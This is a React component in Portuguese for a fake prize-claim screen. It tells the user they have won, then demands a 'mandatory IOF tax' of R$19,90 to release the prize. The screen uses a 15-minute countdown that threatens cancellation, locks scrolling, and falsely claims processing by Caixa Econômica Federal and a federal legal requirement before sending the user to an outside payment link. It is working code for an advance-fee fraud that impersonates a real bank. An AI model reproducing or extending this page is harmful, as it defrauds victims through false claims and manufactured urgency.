import React, { useState } from 'react';
import { AlertTriangle, ExternalLink, Clock, Shield, CheckCircle } from 'lucide-react';

interface TaxPaymentScreenProps {
  customerName: string;
  winningNumber: number;
  prizeAmount: number;
}

const TaxPaymentScreen: React.FC<TaxPaymentScreenProps> = ({
  customerName,
  winningNumber,
  prizeAmount
}) => {
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutos
  const [isRedirecting, setIsRedirecting] = useState(false);

  // Bloquear scroll do body quando o componente for montado
  React.useEffect(() => {
    // Salvar o overflow original
    const originalOverflow = document.body.style.overflow;
    
    // Bloquear scroll
    document.body.style.overflow = 'hidden';
    
    // Cleanup: restaurar overflow quando o componente for desmontado
    return () => {
      document.body.style.overflow = originalOverflow;
    };
  }, []);

  // Countdown timer
  React.useEffect(() => {
    if (timeLeft <= 0) return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const formatNumber = (num: number) => {
    return num.toString().padStart(5, '0');
  };

  const formatCurrency = (value: number) => {
    return value.toLocaleString('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    });
  };

  const handlePayTax = () => {
    setIsRedirecting(true);
    
    // Redirecionar para o link fornecido
    setTimeout(() => {
      window.open('https://caixamisteriosa.online/iof', '_blank');
    }, 1500);
  };

  const taxAmount = 1990; // R$ 19,90 em centavos

  return (
    <div className="fixed inset-0 bg-gradient-to-br from-orange-600 via-red-600 to-pink-600 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-2xl p-6 max-w-md w-full mx-auto shadow-2xl max-h-full overflow-y-auto">
        
        {/* Header */}
        <div className="text-center mb-6">
          <div className="text-4xl mb-3">🏆</div>
          <h1 className="text-2xl font-bold text-gray-800 mb-2">
            PRÊMIO CONFIRMADO!
          </h1>
          <p className="text-gray-600 text-sm">
            Parabéns {customerName}, você ganhou!
          </p>
        </div>

        {/* Resumo do Prêmio */}
        <div className="bg-green-50 border-2 border-green-200 rounded-xl p-4 mb-6">
          <div className="text-center">
            <div className="flex items-center justify-center gap-2 mb-2">
              <CheckCircle className="w-5 h-5 text-green-600" />
              <span className="font-bold text-green-800">PRÊMIO GARANTIDO</span>
            </div>
            <div className="text-sm text-green-700 mb-2">
              Número sorteado: <span className="font-mono font-bold">{formatNumber(winningNumber)}</span>
            </div>
            <div className="text-3xl font-black text-green-800">
              {formatCurrency(prizeAmount)}
            </div>
            <div className="text-sm text-green-600 mt-1">
              Pagamento via PIX em até 24h
            </div>
          </div>
        </div>

        {/* Aviso de Taxa */}
        <div className="bg-orange-50 border-2 border-orange-300 rounded-xl p-4 mb-6">
          <div className="flex items-start gap-3">
            <AlertTriangle className="w-6 h-6 text-orange-600 flex-shrink-0 mt-1" />
            <div>
              <h3 className="font-bold text-orange-800 mb-2">
                📋 Taxa de Liberação Obrigatória
              </h3>
              <p className="text-sm text-orange-700 mb-3">
                Para liberar seu prêmio, é necessário o pagamento da taxa de imposto IOF conforme legislação brasileira.
              </p>
              
              <div className="bg-white rounded-lg p-3 border border-orange-200">
                <div className="flex justify-between items-center mb-2">
                  <span className="text-sm text-gray-600">Taxa IOF (6%):</span>
                  <span className="font-bold text-gray-800">{formatCurrency(taxAmount)}</span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm font-bold text-green-700">Valor líquido a receber:</span>
                  <span className="font-bold text-green-700">{formatCurrency(prizeAmount - taxAmount)}</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Timer de Urgência */}
        <div className="bg-red-50 border-2 border-red-300 rounded-xl p-4 mb-6">
          <div className="flex items-center justify-center gap-2 mb-2">
            <Clock className="w-5 h-5 text-red-600" />
            <span className="font-bold text-red-800">TEMPO PARA PAGAMENTO:</span>
          </div>
          <div className="text-center">
            <div className="text-3xl font-black text-red-600 mb-1">
              {formatTime(timeLeft)}
            </div>
            <p className="text-xs text-red-700">
              Após este prazo, o prêmio será cancelado
            </p>
          </div>
        </div>

        {/* Informações de Segurança */}
        <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-6">
          <div className="flex items-center gap-2 mb-2">
            <Shield className="w-4 h-4 text-blue-600" />
            <span className="text-sm font-bold text-blue-800">Processo Seguro</span>
          </div>
          <ul className="text-xs text-blue-700 space-y-1">
            <li>✅ Pagamento processado pela Caixa Econômica</li>
            <li>✅ Taxa obrigatória por lei federal</li>
            <li>✅ Prêmio liberado automaticamente após pagamento</li>
            <li>✅ Comprovante enviado por WhatsApp</li>
          </ul>
        </div>

        {/* Botão de Pagamento */}
        <button
          onClick={handlePayTax}
          disabled={isRedirecting}
          className="w-full bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white font-bold py-4 px-6 rounded-xl text-lg transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
        >
          {isRedirecting ? (
            <>
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
              REDIRECIONANDO...
            </>
          ) : (
            <>
              <ExternalLink className="w-5 h-5" />
              PAGAR TAXA IOF - {formatCurrency(taxAmount)}
            </>
          )}
        </button>

        {/* Rodapé */}
        <div className="text-center mt-4">
          <p className="text-xs text-gray-500">
            🔒 Pagamento seguro via Caixa Econômica Federal
          </p>
        </div>
      </div>
    </div>
  );
};

export default TaxPaymentScreen;